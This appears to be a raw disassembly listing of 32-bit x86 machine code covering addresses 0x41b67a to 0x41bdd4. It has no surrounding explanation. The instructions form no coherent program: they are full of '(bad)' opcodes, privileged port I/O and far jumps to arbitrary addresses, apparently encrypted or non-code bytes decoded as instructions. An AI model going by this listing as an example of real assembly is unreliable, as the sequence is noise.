  41b67a:	fs or  edx,edi
  41b67d:	loope  0x41b66e
  41b67f:	cmp    BYTE PTR [ecx+0x23],ch
  41b682:	push   eax
  41b683:	push   es
  41b684:	or     DWORD PTR [ebx],esp
  41b686:	fdivp  st(1),st
  41b688:	sbb    edi,DWORD PTR [ebp+0x9]
  41b68b:	adc    eax,0x830f4503
  41b690:	aaa    
  41b691:	loop   0x41b706
  41b693:	mov    ebp,0x1e95d1d0
  41b698:	jle    0x41b696
  41b69a:	fadd   QWORD PTR [ebx]
  41b69c:	or     al,0x93
  41b69e:	jmp    0x41b636
  41b6a0:	or     bl,BYTE PTR [eax]
  41b6a2:	mov    ecx,0xf111c794
  41b6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6a8:	adc    eax,0xa18d86ba
  41b6ad:	xlat   BYTE PTR ds:[ebx]
  41b6ae:	mov    dl,0x82
  41b6b0:	(bad)  
  41b6b2:	fnsave [eax]
  41b6b4:	inc    ebp
  41b6b5:	jnp    0x41b702
  41b6b7:	retf   0x9f05
  41b6ba:	aam    0xd1
  41b6bc:	xchg   esp,eax
  41b6bd:	out    dx,eax
  41b6be:	popf   
  41b6bf:	dec    esp
  41b6c0:	cmp    BYTE PTR [edi-0x6dc67cb2],ah
  41b6c6:	fisttp QWORD PTR [ecx+esi*2]
  41b6c9:	fdivr  st(5),st
  41b6cb:	ja     0x41b6c6
  41b6cd:	scas   eax,DWORD PTR es:[edi]
  41b6ce:	int3   
  41b6cf:	jno    0x41b684
  41b6d1:	arpl   WORD PTR [ecx-0x5e],cx
  41b6d4:	lock ret 0x3036
  41b6d8:	ret    0xdf7c
  41b6db:	(bad)  
  41b6dc:	fnsave [ebx]
  41b6de:	rol    DWORD PTR [ebx],0xc6
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0x2ae4970a]
  41b6f4:	xor    DWORD PTR [eax+ebx*8+0x10787fe0],ecx
  41b6fb:	jle    0x41b775
  41b6fd:	js     0x41b713
  41b6ff:	retf   0x6b4e
  41b702:	push   edi
  41b703:	or     eax,0x9cc7df5c
  41b708:	pop    ds
  41b709:	push   eax
  41b70a:	outs   dx,BYTE PTR ds:[esi]
  41b70b:	in     al,0xf0
  41b70d:	and    edi,DWORD PTR [esi-0x7e95b29c]
  41b713:	das    
  41b714:	mov    eax,0x436cf653
  41b719:	ret    
  41b71a:	(bad)  
  41b71b:	and    al,dh
  41b71d:	inc    ebx
  41b71e:	fdiv   st(2),st
  41b720:	and    DWORD PTR [eax+esi*2+0x6aef6eab],esi
  41b727:	inc    eax
  41b728:	ret    
  41b729:	repnz mov dl,0x9a
  41b72c:	sti    
  41b72d:	xchg   ebx,eax
  41b72e:	jl     0x41b6ef
  41b730:	cmp    eax,0x48d1f454
  41b735:	dec    DWORD PTR [esp+ecx*4]
  41b738:	and    al,0xee
  41b73a:	sub    eax,0x84e36910
  41b73f:	in     al,0x19
  41b741:	ds aaa 
  41b743:	call   0x40315efb
  41b748:	mov    cl,0x59
  41b74a:	or     DWORD PTR [esi],esi
  41b74c:	in     eax,dx
  41b74d:	xor    dh,cl
  41b74f:	push   0x5728a6fc
  41b754:	fmul   DWORD PTR [ebx+ebp*4+0x4d]
  41b758:	push   ds
  41b759:	sahf   
  41b75a:	adc    dl,bh
  41b75c:	xchg   DWORD PTR [esi],edx
  41b75e:	inc    esi
  41b75f:	add    eax,0xbae0305b
  41b764:	sbb    eax,0xe3ed30cc
  41b769:	jns    0x41b707
  41b76b:	sbb    al,0x43
  41b76d:	or     al,BYTE PTR ds:0x4c28e48b
  41b773:	loop   0x41b785
  41b775:	sub    edi,DWORD PTR [ecx]
  41b777:	mul    DWORD PTR [ebp-0x4c]
  41b77a:	in     eax,dx
  41b77b:	aaa    
  41b77c:	ret    0xdf1f
  41b77f:	or     ecx,DWORD PTR [ecx-0x373768db]
  41b785:	jmp    0x601ac854
  41b78a:	push   es
  41b78b:	cmp    ebx,DWORD PTR [ecx-0x67]
  41b78e:	cdq    
  41b78f:	fsubrp st(3),st
  41b791:	pushf  
  41b792:	gs pop ds
  41b794:	or     ebx,DWORD PTR [eax-0x20]
  41b797:	stos   DWORD PTR es:[edi],eax
  41b798:	in     al,dx
  41b799:	mov    al,0xad
  41b79b:	ins    DWORD PTR es:[edi],dx
  41b79c:	mov    ebp,0x404fe570
  41b7a1:	xchg   ebx,eax
  41b7a2:	retf   0x298c
  41b7a5:	fld    DWORD PTR [edx-0x7fa90718]
  41b7ab:	daa    
  41b7ac:	loop   0x41b733
  41b7ae:	jae    0x41b736
  41b7b0:	add    eax,0xdf15afeb
  41b7b5:	ds aam 0xc0
  41b7b8:	(bad)  
  41b7b9:	push   eax
  41b7ba:	and    DWORD PTR [ebp+0x25e4fae7],esi
  41b7c0:	or     eax,0x6ded3cb3
  41b7c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7c6:	loopne 0x41b827
  41b7c8:	mul    DWORD PTR [esi]
  41b7ca:	xchg   edx,eax
  41b7cb:	aaa    
  41b7cc:	push   esi
  41b7cd:	bound  esi,QWORD PTR [edi]
  41b7cf:	das    
  41b7d0:	pop    eax
  41b7d1:	xor    eax,0x4f1cafea
  41b7d6:	scas   al,BYTE PTR es:[edi]
  41b7d7:	or     al,0xc0
  41b7d9:	fist   DWORD PTR [edx+0x69]
  41b7dc:	ins    DWORD PTR es:[edi],dx
  41b7dd:	and    al,0xea
  41b7df:	stos   BYTE PTR es:[edi],al
  41b7e0:	stc    
  41b7e1:	jp     0x41b807
  41b7e3:	aam    0x2a
  41b7e5:	ret    
  41b7e6:	ror    BYTE PTR [edx+ebx*2+0x72f15346],0xbd
  41b7ee:	pop    es
  41b7ef:	pop    ebp
  41b7f0:	and    ch,0x4e
  41b7f3:	jl     0x41b7a4
  41b7f5:	mov    esp,0xc1dd62c3
  41b7fa:	hlt    
  41b7fb:	call   0xf55611c5
  41b800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b801:	dec    ebx
  41b802:	pop    ds
  41b803:	jmp    0x77a324b2
  41b808:	retf   
  41b809:	cld    
  41b80a:	xchg   ebp,eax
  41b80b:	cmp    eax,0x15dcb9a1
  41b810:	push   ebp
  41b811:	jl     0x41b875
  41b813:	daa    
  41b814:	mov    esi,0x82e1780f
  41b819:	(bad)  
  41b81a:	rol    DWORD PTR [ecx+0x50],1
  41b81d:	push   esi
  41b81e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b81f:	lods   eax,DWORD PTR ds:[esi]
  41b820:	add    dl,BYTE PTR [ebx]
  41b822:	xlat   BYTE PTR ds:[ebx]
  41b823:	xchg   cx,ax
  41b825:	mov    al,0x5b
  41b827:	daa    
  41b828:	(bad)  
  41b82a:	mov    eax,0xd2eb5b23
  41b82f:	cmp    eax,0xae28905e
  41b834:	dec    DWORD PTR [edi]
  41b836:	(bad)  
  41b837:	mov    ebp,DWORD PTR [ebp+0x332b701]
  41b83d:	xchg   ecx,eax
  41b83e:	pop    es
  41b83f:	fidivr DWORD PTR [edx+0x5c]
  41b842:	mov    dl,0x32
  41b844:	or     BYTE PTR [edx],ch
  41b846:	mov    ds:0x937a2424,al
  41b84b:	mov    eax,0xea527bf1
  41b850:	fs mov edi,edi
  41b853:	jmp    0xa1d4b096
  41b858:	cwde   
  41b859:	dec    esi
  41b85a:	ins    DWORD PTR es:[edi],dx
  41b85b:	fnsave [esi]
  41b85d:	data16 sahf 
  41b85f:	fstp   st(2)
  41b861:	cmc    
  41b862:	int    0xf
  41b864:	sub    ah,BYTE PTR [edi+0x386765e4]
  41b86a:	pop    esp
  41b86b:	sbb    ah,bh
  41b86d:	xchg   DWORD PTR [edi+0x7e0cac6],eax
  41b873:	jg     0x41b87d
  41b875:	into   
  41b876:	jg     0x41b7fe
  41b878:	call   0xa028f4d7
  41b87d:	ret    0x9abb
  41b880:	push   0x4a5a36c4
  41b885:	mov    bl,0xce
  41b887:	or     bh,dh
  41b889:	jl     0x41b8e8
  41b88b:	cmc    
  41b88c:	push   ds
  41b88d:	mov    al,0x1b
  41b890:	jmp    0x7f1ead41
  41b895:	inc    esi
  41b897:	dec    esi
  41b898:	lds    edi,FWORD PTR [edx-0x63]
  41b89b:	rcr    BYTE PTR [ecx+0x4adf5bd1],cl
  41b8a1:	int    0x18
  41b8a3:	out    0x54,eax
  41b8a5:	leave  
  41b8a6:	(bad)  
  41b8a8:	cs dec edi
  41b8aa:	rcr    ch,cl
  41b8ac:	div    DWORD PTR [esp+ecx*4+0x6c8622aa]
  41b8b3:	jecxz  0x41b851
  41b8b5:	pusha  
  41b8b6:	dec    edx
  41b8b7:	gs cmc 
  41b8b9:	(bad)
  41b8bc:	mov    ch,BYTE PTR [ecx-0x27]
  41b8bf:	cmp    bh,dl
  41b8c1:	and    ebp,DWORD PTR [edi-0x42f71d6e]
  41b8c7:	test   al,0x27
  41b8c9:	pop    ecx
  41b8ca:	ds sar bl,1
  41b8cd:	push   ss
  41b8ce:	gs mov ah,0x2a
  41b8d1:	retf   0xa9eb
  41b8d4:	arpl   sp,bx
  41b8d6:	mov    ds:0x15c8433c,eax
  41b8db:	or     DWORD PTR [ecx],esi
  41b8dd:	mov    cs,WORD PTR [eax-0x4d]
  41b8e0:	adc    al,0x15
  41b8e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8e3:	sbb    bl,BYTE PTR [eax-0x67]
  41b8e6:	(bad)  
  41b8e7:	xor    eax,0x97f0b82f
  41b8ec:	xchg   ebp,eax
  41b8ed:	pop    ecx
  41b8ee:	popa   
  41b8ef:	cs dec ecx
  41b8f1:	xor    eax,0x873e476c
  41b8f6:	sub    ah,BYTE PTR [edi+ecx*2+0x68e8b175]
  41b8fd:	pop    es
  41b8fe:	sub    bl,BYTE PTR [esi+0x53]
  41b901:	retf   0x2a65
  41b904:	jns    0x41b957
  41b906:	xchg   ecx,eax
  41b907:	out    dx,al
  41b908:	push   es
  41b909:	cs inc edx
  41b90b:	push   ebp
  41b90c:	retf   
  41b90d:	and    eax,0xb289af70
  41b912:	jb     0x41b979
  41b914:	pop    cx
  41b916:	imul   eax,DWORD PTR [edx]
  41b919:	mov    edx,DWORD PTR [ebp-0x4]
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx-0x53c8deca]
  41b92f:	shl    eax,1
  41b931:	lock out 0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b8fc
  41b93a:	je     0x41b9bb
  41b93c:	lock mov ebx,0x183015be
  41b942:	jno    0x41b908
  41b944:	scas   al,BYTE PTR es:[edi]
  41b945:	xchg   ecx,eax
  41b946:	dec    edi
  41b947:	inc    ebp
  41b948:	mov    ch,0xb1
  41b94a:	xlat   BYTE PTR ds:[ebx]
  41b94b:	test   BYTE PTR [esi],al
  41b94d:	retf   
  41b94e:	inc    edi
  41b94f:	mov    dh,0x22
  41b951:	pop    ecx
  41b952:	int3   
  41b953:	ins    BYTE PTR es:[edi],dx
  41b954:	adc    BYTE PTR [esp+eiz*8],0xec
  41b958:	mov    bl,0x3b
  41b95a:	inc    eax
  41b95b:	xchg   esi,eax
  41b95c:	mov    edx,0xe53f78d4
  41b961:	clc    
  41b962:	pusha  
  41b963:	mov    dl,0x75
  41b965:	pusha  
  41b966:	fadd   DWORD PTR [edx-0x52899168]
  41b96c:	xlat   BYTE PTR ds:[ebx]
  41b96d:	rcr    DWORD PTR [esp+edx*2],0x60
  41b971:	xchg   DWORD PTR [eax-0x59f8f988],esi
  41b977:	test   DWORD PTR [ebx+0x21],ebx
  41b97a:	and    al,0x74
  41b97c:	xor    BYTE PTR [esi+eax*8-0x1756afe7],dl
  41b983:	pop    edi
  41b984:	cmp    eax,0xcf4fd700
  41b989:	mov    eax,ds:0x2ab0dbef
  41b98e:	lock push ds
  41b990:	xchg   esp,eax
  41b991:	fsub   QWORD PTR [edi-0x72ea3e39]
  41b997:	xchg   edx,eax
  41b998:	sti    
  41b999:	not    esi
  41b99b:	add    ebx,DWORD PTR [eax+0x39e07182]
  41b9a1:	adc    eax,0x2b5e72b1
  41b9a6:	inc    BYTE PTR [ebx+0x5580dad8]
  41b9ac:	mov    edi,0xea21eb10
  41b9b1:	mov    al,0xc8
  41b9b3:	sbb    eax,0xf9dac62
  41b9b8:	pop    esi
  41b9b9:	(bad)  
  41b9ba:	xlat   BYTE PTR ds:[ebx]
  41b9bb:	mov    ebx,edx
  41b9bd:	loop   0x41b9cd
  41b9bf:	dec    edx
  41b9c0:	xchg   DWORD PTR [edx-0x4f9fdd7e],edx
  41b9c6:	inc    edi
  41b9c7:	push   es
  41b9c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9ca:	push   eax
  41b9cb:	fmul   st,st(3)
  41b9cd:	repnz sar DWORD PTR [edx],1
  41b9d0:	sub    al,0x7b
  41b9d2:	xor    ecx,DWORD PTR [esi+eax*4+0x7a]
  41b9d6:	ret    
  41b9d7:	jne    0x41b9a1
  41b9d9:	jecxz  0x41ba06
  41b9db:	xor    al,0xd9
  41b9dd:	pop    ss
  41b9de:	bound  esi,QWORD PTR ds:0x1d8d1193
  41b9e4:	push   0x84bf3f8
  41b9e9:	push   ss
  41b9ea:	pop    ebx
  41b9eb:	test   eax,0x628e9c7
  41b9f0:	sub    DWORD PTR [ebp+edx*8+0x7e],esi
  41b9f4:	pop    ecx
  41b9f5:	cs test edx,edi
  41b9f8:	movq   mm7,mm5
  41b9fb:	outs   dx,BYTE PTR ds:[esi]
  41b9fc:	in     al,0x98
  41b9fe:	stos   BYTE PTR es:[edi],al
  41b9ff:	pop    edi
  41ba00:	add    ch,BYTE PTR [ebx+ebx*8+0x26]
  41ba04:	jns    0x41ba08
  41ba06:	cmp    al,0x56
  41ba08:	or     BYTE PTR [eax+0x11],0x8d
  41ba0c:	dec    bp
  41ba0e:	xchg   edx,eax
  41ba0f:	inc    ebp
  41ba10:	push   0x595e4966
  41ba15:	add    al,0x7
  41ba17:	mov    esi,0xcc026579
  41ba1c:	inc    edx
  41ba1d:	loopne 0x41b9be
  41ba1f:	aam    0x1
  41ba21:	inc    ebx
  41ba22:	xor    BYTE PTR [ebx-0x5],al
  41ba25:	push   ss
  41ba26:	pushf  
  41ba27:	ret    0xf7b2
  41ba2a:	mov    WORD PTR [edx+0x3d30e07],gs
  41ba30:	mov    WORD PTR [ebx],ss
  41ba32:	push   0x27
  41ba34:	xor    bh,BYTE PTR [edi+ebp*1+0x4a5d413a]
  41ba3b:	pop    edx
  41ba3c:	ret    
  41ba3d:	add    dh,BYTE PTR [esi]
  41ba3f:	cmp    dh,dl
  41ba41:	ja     0x41ba1b
  41ba43:	pusha  
  41ba44:	mov    esi,0x2bb78bb1
  41ba49:	(bad)  
  41ba4a:	or     ebx,DWORD PTR [ebp+0x1c]
  41ba4d:	sub    BYTE PTR [eax-0xa],dh
  41ba50:	sub    ecx,DWORD PTR [edx+0x1c]
  41ba53:	rol    BYTE PTR [edi-0x267703cc],0x60
  41ba5a:	push   esp
  41ba5b:	pop    ss
  41ba5c:	into   
  41ba5d:	jp     0x41ba1a
  41ba5f:	lds    esp,FWORD PTR [eax-0x27]
  41ba62:	sbb    BYTE PTR [ecx+0x30],cl
  41ba65:	popa   
  41ba66:	push   ebp
  41ba67:	call   0x6bf6:0xc0cf004c
  41ba6e:	mov    edx,0x6971707e
  41ba73:	popa   
  41ba74:	loop   0x41ba19
  41ba76:	jp     0x41ba38
  41ba78:	es int 0x8
  41ba7b:	xlat   BYTE PTR ds:[ebx]
  41ba7c:	arpl   WORD PTR [ecx-0x7],bp
  41ba7f:	adc    eax,DWORD PTR [edi+ecx*2]
  41ba82:	jb     0x41bae5
  41ba84:	xchg   ecx,eax
  41ba85:	sub    bl,BYTE PTR [eax+0x59]
  41ba88:	push   es
  41ba89:	xor    al,0x90
  41ba8b:	jbe    0x41bac8
  41ba8d:	mov    cl,0x78
  41ba8f:	ds popa 
  41ba91:	loopne 0x41ba52
  41ba93:	(bad)  
  41ba94:	aam    0xda
  41ba96:	call   0xb6552dce
  41ba9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba9c:	nop
  41ba9d:	cld    
  41ba9e:	sbb    al,0x4a
  41baa0:	inc    esp
  41baa1:	(bad)  
  41baa2:	pop    esi
  41baa3:	dec    eax
  41baa4:	stos   BYTE PTR es:[edi],al
  41baa5:	bound  esi,QWORD PTR ds:0xac9e7298
  41baab:	push   eax
  41baac:	sub    BYTE PTR [esi],al
  41baae:	pop    esp
  41baaf:	enter  0x35c1,0xd3
  41bab3:	or     edi,DWORD PTR [ebp+0x52]
  41bab6:	sub    eax,0xff00580e
  41babb:	and    al,0x75
  41babd:	add    BYTE PTR [esi+0x71a35479],dl
  41bac3:	je     0x41ba55
  41bac5:	and    ch,BYTE PTR [eax-0x2236a97a]
  41bacb:	and    BYTE PTR [ecx+0x54669b55],dh
  41bad1:	cld    
  41bad2:	xor    eax,0xccaf0c63
  41bad7:	xchg   ebx,eax
  41bad8:	punpckldq mm3,DWORD PTR [ebx]
  41badb:	test   eax,0x3c659ed2
  41bae0:	(bad)  
  41bae1:	imul   edi,DWORD PTR [ecx],0x2b
  41bae4:	jno    0x41bb3f
  41bae6:	test   eax,esp
  41bae8:	xor    BYTE PTR [esp+eax*1-0x6b],ch
  41baec:	sub    ah,bl
  41baee:	in     eax,dx
  41baef:	xlat   BYTE PTR ds:[ebx]
  41baf0:	xchg   ecx,eax
  41baf1:	adc    DWORD PTR [edi-0x68550606],ebx
  41baf7:	jl     0x41babe
  41baf9:	pop    edi
  41bafa:	imul   edi,ecx,0x1fa566e3
  41bb00:	push   eax
  41bb01:	loope  0x41bb46
  41bb03:	gs retf 0x7c75
  41bb07:	add    ah,BYTE PTR [edx+0x48]
  41bb0a:	push   es
  41bb0b:	in     eax,dx
  41bb0c:	mov    ds,WORD PTR [edi+0x62]
  41bb0f:	(bad)  
  41bb10:	aas    
  41bb11:	jmp    0xb3ad:0x6f3438e7
  41bb18:	adc    ecx,DWORD PTR [esp+esi*4-0x75860e15]
  41bb1f:	mov    al,BYTE PTR [ecx]
  41bb21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb22:	daa    
  41bb23:	mov    ds:0x479e85e8,eax
  41bb28:	std    
  41bb29:	or     eax,0x18d4a9a8
  41bb2e:	mov    eax,ds:0xdc4a585c
  41bb33:	xchg   edx,eax
  41bb34:	and    DWORD PTR [eax+0xe1d56f],ebp
  41bb3a:	xchg   edi,eax
  41bb3b:	mov    ebp,0x1b9bb41c
  41bb40:	sub    al,0x69
  41bb42:	mov    ds:0xc1fb4ead,eax
  41bb47:	adc    BYTE PTR [esi],al
  41bb49:	stos   DWORD PTR es:[edi],eax
  41bb4a:	sbb    ecx,esi
  41bb4c:	mov    di,0x3ec6
  41bb50:	popf   
  41bb51:	xor    edx,ecx
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xf17bf12
  41bb65:	rol    BYTE PTR [ebx+0x7fe488bf],0x78
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bafe
  41bb71:	jno    0x41bb05
  41bb73:	xor    eax,0x63294fe
  41bb78:	mov    al,0x66
  41bb7a:	popa   
  41bb7b:	add    eax,0x8584e1f8
  41bb80:	add    al,0x8
  41bb82:	psllq  mm7,QWORD PTR [edx+0x1b]
  41bb86:	enter  0x17ff,0x7d
  41bb8a:	pop    ds
  41bb8b:	push   ebx
  41bb8c:	cld    
  41bb8d:	fs js  0x41bb1d
  41bb90:	mov    BYTE PTR [esi+ebp*2],bl
  41bb93:	(bad)  
  41bb94:	jp     0x41bbdc
  41bb96:	out    0xa0,eax
  41bb98:	cld    
  41bb99:	scas   eax,DWORD PTR es:[edi]
  41bb9a:	inc    edi
  41bb9b:	push   esi
  41bb9c:	inc    ebp
  41bb9d:	sbb    al,0xd1
  41bb9f:	pop    edx
  41bba0:	jae    0x41bbee
  41bba2:	pop    ebp
  41bba3:	pop    esi
  41bba4:	xor    bh,BYTE PTR [esi+eiz*1]
  41bba7:	inc    ebp
  41bba8:	and    BYTE PTR [bx+0x3f72],0x26
  41bbae:	fisubr DWORD PTR [ebx]
  41bbb0:	aad    0x89
  41bbb2:	jbe    0x41bc04
  41bbb4:	lods   al,BYTE PTR ds:[esi]
  41bbb5:	inc    ebx
  41bbb6:	leave  
  41bbb7:	dec    esi
  41bbb8:	mov    al,0x74
  41bbba:	loope  0x41bb48
  41bbbc:	adc    BYTE PTR [ecx-0x4f],bh
  41bbbf:	sub    ebx,DWORD PTR [edi]
  41bbc1:	dec    esi
  41bbc2:	scas   eax,DWORD PTR es:[edi]
  41bbc3:	ror    al,cl
  41bbc5:	mov    ecx,0xae0c496d
  41bbca:	rep stos DWORD PTR es:[edi],eax
  41bbcc:	push   ebp
  41bbcd:	loopne 0x41bb8f
  41bbcf:	jl     0x41bb5c
  41bbd1:	xor    al,0x55
  41bbd3:	mov    ds,WORD PTR [eax+0x7]
  41bbd6:	lahf   
  41bbd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbd8:	out    0x2,al
  41bbda:	jmp    0x41bb89
  41bbdc:	gs cmp ch,ah
  41bbdf:	or     BYTE PTR [edi-0x5],0x13
  41bbe3:	or     ch,BYTE PTR [ebp+ecx*1-0x35]
  41bbe7:	push   edx
  41bbe8:	push   eax
  41bbe9:	arpl   bp,di
  41bbeb:	mov    eax,ds:0x6709fa81
  41bbf0:	push   esp
  41bbf1:	mov    WORD PTR [edi+eiz*2-0x1180c46d],ss
  41bbf8:	cmp    BYTE PTR [ebx],bh
  41bbfa:	aam    0x4d
  41bbfc:	addr16 jle 0x41bb9d
  41bbff:	and    al,0xe7
  41bc01:	aaa    
  41bc02:	pop    ebp
  41bc03:	inc    eax
  41bc04:	cmc    
  41bc05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc06:	or     edx,DWORD PTR [ebx]
  41bc08:	sub    BYTE PTR cs:[esi+0x74],ah
  41bc0c:	stos   BYTE PTR es:[edi],al
  41bc0d:	hlt    
  41bc0e:	xor    ebx,eax
  41bc10:	mov    ebp,0xa87eaa0d
  41bc15:	inc    edi
  41bc16:	dec    edx
  41bc17:	ret    
  41bc18:	fdiv   st(0),st
  41bc1a:	cmc    
  41bc1b:	inc    eax
  41bc1c:	mov    bl,0x99
  41bc1e:	jmp    0xe796:0x7496a884
  41bc25:	cld    
  41bc26:	popa   
  41bc27:	and    DWORD PTR [edx+ebp*8],ecx
  41bc2a:	aaa    
  41bc2b:	jmp    0x5994:0xbd55b3b8
  41bc32:	sti    
  41bc33:	xchg   esi,eax
  41bc34:	mov    al,0x58
  41bc36:	call   0x913e789e
  41bc3b:	imul   edi,ebp,0xcade7302
  41bc41:	dec    edi
  41bc42:	stc    
  41bc43:	pop    edx
  41bc44:	nop
  41bc45:	add    bh,BYTE PTR [eax]
  41bc47:	mov    dl,0xcf
  41bc49:	mov    esi,0x53e3fb09
  41bc4e:	xor    al,0xae
  41bc50:	aas    
  41bc51:	push   ecx
  41bc52:	js     0x41bccc
  41bc54:	fisubr DWORD PTR [eax-0xb]
  41bc57:	call   0x5406:0xe62fbcee
  41bc5e:	ror    DWORD PTR [ebx+0x7510b11e],1
  41bc64:	add    al,BYTE PTR [eax]
  41bc66:	lods   al,BYTE PTR ds:[esi]
  41bc67:	pop    ebp
  41bc68:	fidiv  DWORD PTR [esi]
  41bc6a:	int    0x37
  41bc6c:	add    BYTE PTR [edi+ebx*4-0x70],dh
  41bc70:	mov    ecx,DWORD PTR [edx+0x5b]
  41bc73:	ja     0x41bc6d
  41bc75:	push   esi
  41bc76:	push   es
  41bc77:	pop    esi
  41bc78:	in     al,dx
  41bc79:	aas    
  41bc7a:	mov    edx,0xc44608c9
  41bc7f:	sbb    ebx,DWORD PTR [esi]
  41bc81:	dec    edx
  41bc82:	clc    
  41bc83:	fisub  WORD PTR [ebp+0x3cc8c7a5]
  41bc89:	adc    eax,0x3019620d
  41bc8e:	aas    
  41bc8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc90:	ss or  edi,edi
  41bc93:	adc    bh,bl
  41bc95:	icebp  
  41bc96:	out    0xeb,al
  41bc98:	inc    ebp
  41bc99:	dec    esi
  41bc9a:	das    
  41bc9b:	dec    ebp
  41bc9c:	test   BYTE PTR [ecx-0x51d8185f],0x3a
  41bca3:	fnstcw WORD PTR [edi-0x21]
  41bca6:	outs   dx,BYTE PTR ds:[esi]
  41bca7:	and    DWORD PTR [ebx],0x53
  41bcaa:	dec    esp
  41bcab:	sbb    DWORD PTR [ebx+0x13],edx
  41bcae:	enter  0x6a9,0x3c
  41bcb2:	sbb    edi,DWORD PTR [eax+0xfa44acd]
  41bcb8:	adc    eax,0xd18e439e
  41bcbd:	dec    esp
  41bcbe:	out    0xf1,al
  41bcc0:	push   ebp
  41bcc1:	pop    eax
  41bcc2:	fld1   
  41bcc4:	cmc    
  41bcc5:	mov    DWORD PTR [ebp-0x57],edi
  41bcc8:	pop    ebx
  41bcc9:	mov    eax,ds:0xd9263af6
  41bcce:	(bad)  
  41bccf:	mov    edi,DWORD PTR [edx-0x9fefe60]
  41bcd5:	call   0xa9657a05
  41bcda:	call   0xaed81a4f
  41bcdf:	add    edx,0xcec3d2c4
  41bce5:	cwde   
  41bce6:	arpl   WORD PTR [ecx],sp
  41bce8:	in     al,0xa
  41bcea:	push   ds
  41bceb:	in     al,dx
  41bcec:	out    0x87,eax
  41bcee:	xchg   edx,eax
  41bcef:	push   es
  41bcf0:	jb     0x41bca8
  41bcf2:	fnstenv [ebp+0x3]
  41bcf5:	cmp    BYTE PTR [ecx-0x49],al
  41bcf8:	xor    ebp,DWORD PTR [ecx+0x36a20e09]
  41bcfe:	popf   
  41bcff:	jl     0x41bcb2
  41bd01:	adc    dl,al
  41bd03:	or     DWORD PTR [ebp-0x4f3f5ccf],ebp
  41bd09:	or     eax,0x5a9267f0
  41bd0e:	xor    esi,edx
  41bd10:	dec    DWORD PTR ds:0x39e59627
  41bd16:	std    
  41bd17:	es jp  0x41bcb3
  41bd1a:	sub    DWORD PTR [ebx-0x6eefdf2b],edi
  41bd20:	and    al,0x48
  41bd22:	push   esi
  41bd23:	mov    cl,0x5d
  41bd25:	sub    eax,0x72a51630
  41bd2a:	jecxz  0x41bd1b
  41bd2c:	in     eax,dx
  41bd2d:	add    eax,DWORD PTR [esi]
  41bd2f:	lahf   
  41bd30:	stos   BYTE PTR es:[edi],al
  41bd31:	shr    bl,1
  41bd33:	xchg   edi,eax
  41bd34:	ds inc edx
  41bd36:	xchg   ebx,eax
  41bd37:	mov    ch,0x16
  41bd39:	retf   0xebbb
  41bd3c:	repnz xchg edx,eax
  41bd3e:	sub    dl,dh
  41bd40:	pop    ebp
  41bd41:	mov    esi,0x8db244ee
  41bd46:	mov    cl,dh
  41bd48:	xchg   ebp,eax
  41bd49:	cwde   
  41bd4a:	in     eax,dx
  41bd4b:	push   edi
  41bd4c:	add    BYTE PTR [ebx-0x10],cl
  41bd4f:	xchg   ebx,eax
  41bd50:	dec    esi
  41bd51:	mov    ecx,0xa20c9083
  41bd56:	jp     0x41bd17
  41bd58:	add    edi,DWORD PTR [esi+esi*2-0x7051dcb]
  41bd5f:	sbb    ebx,edx
  41bd61:	loopne 0x41bdd9
  41bd63:	cmp    esi,edi
  41bd65:	arpl   WORD PTR [esi+0x64538418],sp
  41bd6b:	mov    esi,0x1b213bf
  41bd70:	push   ebx
  41bd71:	inc    esi
  41bd72:	sbb    dl,ch
  41bd74:	xchg   edx,eax
  41bd75:	fs out 0x88,al
  41bd78:	xor    eax,0x2a8e5a61
  41bd7d:	repz hlt 
  41bd7f:	mov    eax,ds:0x534f7cfe
  41bd84:	and    al,0xe4
  41bd86:	fild   DWORD PTR [ebx+ecx*4+0x30e9084d]
  41bd8d:	add    al,BYTE PTR [eax]
  41bd8f:	add    dh,cl
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xffffff8e
  41bd9d:	loop   0x41bdf2
  41bd9f:	frstor [eax+0x10787fea]
  41bda5:	jle    0x41be1f
  41bda7:	js     0x41bd9b
  41bda9:	mov    cl,0x6
  41bdab:	fsubr  DWORD PTR [ecx-0x77312fad]
  41bdb1:	lods   eax,DWORD PTR ds:[esi]
  41bdb2:	jg     0x41be02
  41bdb4:	cmp    al,0x3e
  41bdb6:	leave  
  41bdb7:	inc    esi
  41bdb8:	call   0x9550f9b5
  41bdbd:	adc    al,0xf2
  41bdbf:	rcr    DWORD PTR [ebp-0x773f760f],1
  41bdc5:	addr16 xchg edx,eax
  41bdc7:	cmp    DWORD PTR [eax],eax
  41bdc9:	push   ebx
  41bdca:	push   eax
  41bdcb:	sbb    ecx,esp
  41bdcd:	xchg   edi,eax
  41bdce:	pop    ss
  41bdcf:	sbb    BYTE PTR [edx-0x32],dh
  41bdd2:	jl     0x41bd5a
  41bdd4:	jle    0x41bd66
